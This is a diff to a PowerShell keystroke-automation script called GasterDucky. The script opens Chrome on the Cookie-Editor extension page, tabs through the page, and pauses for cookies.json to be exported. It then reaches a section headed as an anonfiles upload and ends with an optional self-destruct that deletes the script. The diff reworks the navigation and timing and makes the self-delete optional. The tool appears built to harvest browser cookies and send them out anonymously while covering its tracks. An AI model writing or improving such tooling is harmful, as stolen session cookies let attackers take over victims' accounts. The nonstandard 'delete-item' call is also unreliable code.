@@ -246,24 +246,22 @@ $GasterDucky = New-Object -ComObject WScript.Shell
 
 
 
-
+write-host "Ready to Ducky!" -ForegroundColor Green
+pause
+write-host ""
 
 
 
 # GasterDucky Script
 write-host "GasterDucky Debug" -ForegroundColor Cyan
-Start-Process chrome.exe "https://www.google.com"
+write-host "Starting chrome.exe with CWS Cookie Extension"
+Start-Process chrome.exe "https://chrome.google.com/webstore/detail/cookie-editor/iphcomljdfghbkdcfndaijbokpgddeno"
 Start-Sleep -m 700
 Focus-Window "Chrome"
-$GasterDucky.SendKeys('^(t)')
-Start-Sleep -m 300
-$gasterducky.SendKeys("https://chrome.google.com/webstore/detail/cookie-editor/iphcomljdfghbkdcfndaijbokpgddeno")
-start-sleep -m 300
-$gasterducky.SendKeys('{ENTER}')
 start-sleep -m 300
 $looptab1 = 0
 while ($looptab1 -lt 9){
-    start-sleep -m 350
+    start-sleep -m 450
     $GasterDucky.SendKeys('{TAB}')
     $looptab1++
 }
@@ -291,7 +289,7 @@ $gasterducky.SendKeys('{ENTER}')
 
 write-host "GasterDucky Paused" -ForegroundColor Yellow
 write-host "Download cookies.json and press enter to continue" -ForegroundColor Cyan
-pause
+$SDMODE = read-host "write SD to enable Self-Destruct, enter to normal continue"
 write-host "GasterDucky Resumed" -ForegroundColor Cyan
 # ANONFILES API START
 
@@ -340,7 +338,15 @@ else{
 
 
 # FOOTER ENDING
-write-host "Self Destruct GasterDucky.ps1"
-Remove-Item .\gasterducky.ps1
+if($SDMODE -eq "sd"){
+    write-host "Self Destructing..."
+    delete-item gasterducky.ps1
+    if($?){
+        write-host "Self Destruct OK" -ForegroundColor Green
+    }
+    else{
+        write-warning "Self Destruct ERROR"
+    }
+}
 write-host "GasterDucky Finished" -ForegroundColor Green
 # FOOTER ENDING
